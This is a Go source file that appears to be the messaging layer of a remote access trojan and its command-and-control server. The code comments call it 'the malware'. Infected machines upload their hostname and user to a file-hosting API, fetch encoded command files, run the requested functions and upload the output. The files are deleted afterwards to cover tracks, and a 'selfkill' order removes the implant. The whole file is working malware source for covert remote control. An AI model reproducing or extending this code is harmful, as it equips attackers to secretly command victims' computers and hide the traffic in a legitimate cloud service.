package api

import (
	"encoding/json"
	"fmt"
	"log"
	"regexp"
	"strings"
)

type OnboardData struct {
	Hostname string `json:"H"`
	User     string `json:"U"`
}

// The function encodes and uploads onboard data as a JSON file.
func WriteOnboard(bearer string, ratId string, data *OnboardData) {
	// called by RAT
	payload, err := json.Marshal(data)
	if err != nil {
		log.Fatalf("Erreur lors de la conversion en JSON: %s", err)
	}
	fileContent := EncodePayload(string(payload))
	UploadFile(bearer, "onboarding-"+ratId+".json", fileContent)
}

func GetRatIdFromOnboardFilename(filename string) string {
	r := regexp.MustCompile("^onboarding-(.{8})\\.json")
	ratId := r.FindStringSubmatch(filename)[1]
	return ratId
}

func ReadOnboard(bearer string) map[string]OnboardData {
	// called by CNC
	fileList := ListFiles(bearer)
	log.Println("[ReadOnboard] list done")
	// only keep file styarting with "onboarding-""
	filtered := make(map[string]string)
	for _, fileStruct := range fileList.Data {
		match, _ := regexp.MatchString("^onboarding-(.{8})\\.json", fileStruct.Filename)
		if match {
			filtered[fileStruct.Filename] = fileStruct.ID
		}
	}

	log.Println("[ReadOnboard] Onboarding list size :", len(filtered))

	// get ratId and associated data
	output := make(map[string]OnboardData)
	for filename, fileId := range filtered {
		log.Println("[ReadOnboard] get content of", fileId)
		fileContent := RetrieveFileContent(bearer, fileId)
		bytePayload := DecodePayload(fileContent)

		onboardData := new(OnboardData)

		err := json.Unmarshal([]byte(bytePayload), onboardData)
		if err != nil {
			fmt.Println("error:", err)
			return nil
		}

		ratId := GetRatIdFromOnboardFilename(filename)
		log.Println("[ReadOnboard] Add new ratID", ratId)
		output[ratId] = *onboardData

	}

	// cleaning
	for _, fileId := range filtered {
		DeleteFile(bearer, fileId)
	}

	return output

}

type RPCRequest struct {
	Function   string   `json:"F"`
	Parameters []string `json:"P"`
}

type RPCReturn struct {
	StandardOutput string `json:"SO"`
	StandardError  string `json:"SE"`
	ReturnCode     int    `json:"R"`
}

type RPCReponse struct {
	RequestId string
	Response  RPCReturn
}

func GetRPCRequestId(filename string) string {
	r := regexp.MustCompile("^rpc-.{8}-(.{8})\\.json")
	infos := r.FindStringSubmatch(filename)
	requestId := infos[1]
	return requestId
}

func GetRPCResponseIds(filename string) (string, string) {
	r := regexp.MustCompile("^return-(.{8})-(.{8})\\.json")
	infos := r.FindStringSubmatch(filename)
	ratId := infos[1]
	requestId := infos[2]
	return ratId, requestId
}

func WriteRPCRequest(bearer string, ratId string, request *RPCRequest) string {
	// called by CNC
	requestId := string(generateKey(8))
	payload, err := json.Marshal(request)
	if err != nil {
		log.Fatalf("Erreur lors de la conversion en JSON: %s", err)
	}
	fileContent := EncodePayload(string(payload))
	UploadFile(bearer, "rpc-"+ratId+"-"+requestId+".json", fileContent)

	return requestId
}

func ProcessRPCRequest(bearer string, ratId string, callbacks map[string]func(*RPCRequest) RPCReturn) {
	// called by RAT

	// get the first RPC request available
	fileList := ListFiles(bearer)
	fileId := ""
	requestId := ""
	for _, fileStruct := range fileList.Data {
		if strings.HasPrefix(fileStruct.Filename, "rpc-"+ratId) {
			fileId = fileStruct.ID
			requestId = GetRPCRequestId(fileStruct.Filename)
			break
		}
	}

	// nothing to do, leave
	if fileId == "" {
		return
	}

	fileContent := RetrieveFileContent(bearer, fileId)
	bytePayload := DecodePayload(fileContent)

	rpcRequest := new(RPCRequest)

	// Parser le JSON
	err := json.Unmarshal([]byte(bytePayload), rpcRequest)
	if err != nil {
		fmt.Println("error:", err)
		return
	}

	// if the function to be executed is not the special one : selfkill
	// selfkill is used to destroy/remove/vanish the malware
	if rpcRequest.Function != "selfkill" {

		response := callbacks[rpcRequest.Function](rpcRequest)

		fmt.Println("Ready to delete ", fileId)
		DeleteFile(bearer, fileId)

		payload, err := json.Marshal(response)
		if err != nil {
			log.Fatalf("Erreur lors de la conversion en JSON: %s", err)
		}

		encodedPayload := EncodePayload(string(payload))
		UploadFile(bearer, "return-"+ratId+"-"+requestId+".json", encodedPayload)
	} else {
		// Special case
		// we return the result before executing the function since the malware
		// may do not run anymore after the selfkill call
		DeleteFile(bearer, fileId)
		response := RPCReponse{requestId, RPCReturn{"Order 66 executed", ratId, 66}}

		payload, err := json.Marshal(response)
		if err != nil {
			log.Fatalf("Erreur lors de la conversion en JSON: %s", err)
		}

		encodedPayload := EncodePayload(string(payload))
		UploadFile(bearer, "return-"+ratId+"-"+requestId+".json", encodedPayload)

		callbacks[rpcRequest.Function](rpcRequest)
	}

}

func ReadRPCResponse(bearer string) map[string][]RPCReponse {
	// called by CNC

	fileList := ListFiles(bearer)

	// only keep file styarting with "return-""
	filtered := make(map[string]string)
	for _, fileStruct := range fileList.Data {
		if strings.HasPrefix(fileStruct.Filename, "return-") {
			filtered[fileStruct.Filename] = fileStruct.ID
		}
	}

	output := make(map[string][]RPCReponse)
	for filename, fileId := range filtered {
		fileContent := RetrieveFileContent(bearer, fileId)
		bytePayload := DecodePayload(fileContent)

		rpcReturn := new(RPCReturn)

		err := json.Unmarshal([]byte(bytePayload), rpcReturn)
		if err != nil {
			fmt.Println("error:", err)
			return nil
		}

		ratId, requestId := GetRPCResponseIds(filename)
		output[ratId] = append(output[ratId], RPCReponse{requestId, *rpcReturn})

		DeleteFile(bearer, fileId)
	}

	return output
}

func PrintRPCFile(bearer string) {
	fileList := ListFiles(bearer)

	for _, fileStruct := range fileList.Data {
		if strings.HasPrefix(fileStruct.Filename, "return-") || strings.HasPrefix(fileStruct.Filename, "rpc-") {
			fmt.Println(fileStruct.ID, " : ", fileStruct.Filename)
		}
	}
}

func CleanRPC(bearer string) {
	fileList := ListFiles(bearer)

	for _, fileStruct := range fileList.Data {
		if strings.HasPrefix(fileStruct.Filename, "return-") || strings.HasPrefix(fileStruct.Filename, "rpc-") {
			DeleteFile(bearer, fileStruct.ID)
			fmt.Println("Clean ", fileStruct.ID, fileStruct.Filename)
		}
	}
}
